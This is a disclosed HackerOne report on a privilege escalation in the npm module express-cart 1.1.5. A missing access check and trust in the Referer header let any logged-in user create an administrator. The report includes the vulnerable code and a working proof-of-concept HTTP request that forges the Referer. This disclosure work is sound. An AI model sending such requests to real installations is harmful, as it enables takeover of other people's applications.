---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '343626'
original_report_id: '343626'
title: Privilege escalation allows any user to add an administrator
weakness: Privilege Escalation
team_handle: nodejs-ecosystem
created_at: '2018-04-26T20:55:17.826Z'
disclosed_at: '2018-07-12T07:57:47.724Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 11
asset_identifier: express-cart
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- privilege-escalation
---

# Privilege escalation allows any user to add an administrator

## Metadata

- HackerOne Report ID: 343626
- Weakness: Privilege Escalation
- Program: nodejs-ecosystem
- Disclosed At: 2018-07-12T07:57:47.724Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report privilege escalation in the npm module express-cart.

It allows a normal user to add another user with administrator privileges.

# Module

**module name:** express-cart
**version:** 1.1.5
**npm page:** `https://www.npmjs.com/package/express-cart`

## Module Description

expressCart is a fully functional shopping cart built in Node.js (Express, MongoDB) with Stripe, PayPal and Authorize.net payments.

## Module Stats

[10] weekly downloads

# Vulnerability

## Vulnerability Description

A deficiency in the access control allows normal users from expressCart to add new users to the application. This behavior by itself might be considered a privilege escalation. However, it was also possible to add the user as administrator.

## Steps To Reproduce:

Firstly, I noticed that all the endpoints located in the *user.js* file are not being restricted by the *common.restrict* middleware, as the other admin routes do.  Also, the endpoint */admin/user/insert* does not check if the user is admin before adding a new user, which I guess it would be a unlikely behavior.

The following code is used to check if it is the first time creating a user:

```
// set the account to admin if using the setup form. Eg: First user account
let urlParts = url.parse(req.header('Referer'));

let isAdmin = false;
if(urlParts.path === '/admin/setup'){
  isAdmin = true;
}
```

As you can see in the above snippet, if you send a request with a Referer containing the string */admin/setup* the user added will be considered an admin. For example:

```
POST /admin/user/insert HTTP/1.1
Host: localhost:1111
Referer: http://localhost:1111/admin/setup
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=[NORMAL_USER_COOKIE]

usersName=NEWADMIN&userEmail=new@admin.com&userPassword=password&frm_userPassword_confirm=password
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

This vulnerability would allow any registered user to create another user with administrator privileges and takeover the application.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
